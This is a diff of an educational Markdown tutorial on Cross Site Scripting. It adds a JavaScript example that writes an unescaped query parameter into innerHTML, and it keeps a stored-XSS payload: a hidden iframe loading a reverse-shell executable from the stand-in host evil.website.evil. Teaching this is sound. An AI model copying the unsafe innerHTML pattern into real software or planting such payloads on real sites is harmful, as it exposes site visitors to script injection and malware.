@@ -23,7 +23,7 @@ Ladies and gentlemen, you have Cross Site Scripting: an exploit of **client-side
 
 If a website accepts input from clients and  **does not validate and sanitize its input**, it may be vulnerable to Cross Site Scripting. Speaking simply, the website must be coded to accept input and **treat it as plain text, not HTML** to avoid this problem.
 
-####Example
+### Example
 
 Consider the following block of HTML code:
 ````html
@@ -59,7 +59,7 @@ This time, we get an error message alert. So far so good, right? We, as the page
 
 Well, what happens when you allow the user to provide input in the form of a...well, form?
 
-Consider this poorly written HTML page with a form in it:
+Consider this  HTML snippet of a form:
 ````html
 ...
  <form action="" method="GET">
@@ -68,13 +68,38 @@ Consider this poorly written HTML page with a form in it:
 </form>
 ...
 ````
+````javascript
+document.addEventListener('DOMContentLoaded', function() {
+    var q = getQueryParameter('q');
+    if (q) {
+        search(q, function(error, results) {
+        showQueryAndResults(q, results);
+    });
+  }
+}
+...
+
+function showQueryAndResults(q, results) {
+    var resultsEl = document.querySelector('#results');
+    var html = '';
+    html += '<p>Your search query:</p>';
+    html += '<pre>' + q + '</pre>';
+    html += '<ul>';
+    for (var index = 0; index < results.length; index++) {
+        html += '<li>' + results[index] + '</li>';
+    }
+    html += '</ul>';
+    resultsEl.innerHTML = html;
+  }
+...
+````
 Notice the addition of the `<input type="text" name="q">` tag. What exactly is this doing?
 
 Well, per the form's tag parameters, it will make a GET request (in this case, to nothing as it's just an example) and will add whatever is put in the search bar to the "q=" parameter. Since this is a <code>GET</code> request, this parameter is viewable in the URL of the page:
 
 ![xss3](../img/xss3.png)
 
-What is more concerning is that there is no **escaping or input validation** in this code. This means that the input from the user side will be brought right into the HTML of the page when the form is submitted.
+The Javascript function that handles this form listens for a value that is added to the "q=" parameter and adds this value straight into the HTML of the page itself. Yikes!
 
 Remember the broken image tag from before? How about we insert it into the page as the user, **not as the author** via XSS?
 
@@ -113,8 +138,3 @@ Consider the following example of a particularly nasty Stored XSS payload:
 `<iframe SRC="http://evil.website.evil/reverseShell.exe" height = "0" width = "0"></iframe>`
 
 Here, the `iframe` HTML tag is used to make an embedded inline frame. This frame ends up looking like a tiny little square on the page when it is rendered in the browser. And as soon as a client visits a page that has been infected with an embedded iframe, their browser will try to access and browse to the iframe's source which, in this example, is `evil.website.evil/reverseShell.exe`. So everyone who visits the page while this XSS payload exists will download and launch a reverse shell program.
-
-Yikes!
-
-
-
